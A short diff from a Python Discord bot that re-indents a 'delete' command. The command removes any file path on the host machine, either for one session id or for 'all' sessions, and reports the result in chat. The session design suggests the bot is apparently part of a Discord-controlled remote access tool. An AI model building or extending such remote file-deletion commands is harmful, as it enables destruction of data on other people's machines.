@@ -249,20 +249,20 @@ while True:
                         x = x + 1
 
         @bot.command()
-async def delete(ctx, session, path):
-    if session == "all":
-        try:
-            os.remove(path)
-            await ctx.send(f"File '{path}' has been deleted.")
-        except Exception as e:
-            await ctx.send(f"An error occurred: {e}")
-    else:
-        if session == sesja:
-            try:
-                os.remove(path)
-                await ctx.send(f"File '{path}' has been deleted.")
-            except Exception as e:
-                await ctx.send(f"An error occurred: {e}")
+        async def delete(ctx, session, path):
+            if session == "all":
+                try:
+                    os.remove(path)
+                    await ctx.send(f"File '{path}' has been deleted.")
+                except Exception as e:
+                    await ctx.send(f"An error occurred: {e}")
+            else:
+                if session == sesja:
+                    try:
+                        os.remove(path)
+                        await ctx.send(f"File '{path}' has been deleted.")
+                    except Exception as e:
+                        await ctx.send(f"An error occurred: {e}")
 
         @bot.command()
         async def message(ctx, sesion, *args):
